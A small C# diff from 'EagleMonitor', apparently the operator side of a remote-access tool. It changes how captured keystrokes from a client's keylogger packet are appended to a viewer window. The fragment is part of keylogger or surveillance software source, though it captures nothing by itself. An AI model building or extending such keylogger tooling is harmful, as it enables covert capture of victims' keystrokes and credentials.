@@ -19,10 +19,8 @@ namespace EagleMonitor.PacketParser
                 ClientHandler.ClientHandlersList[keylogPacket.baseIp].keyloggerForm.BeginInvoke((MethodInvoker)(() =>
                 {
                     ClientHandler.ClientHandlersList[keylogPacket.baseIp].keyloggerForm.hasAlreadyConnected = true;
-                    ClientHandler.ClientHandlersList[keylogPacket.baseIp].keyloggerForm.keystrokeRichTextBox.AppendText(keylogPacket.keyStroke);
-                    keylogPacket = null;
+                    ClientHandler.ClientHandlersList[keylogPacket.baseIp].keyloggerForm.keystrokeRichTextBox.AppendText(keylogPacket.keyStroke);               
                 }));
-                return;
             }
             catch { }
         }
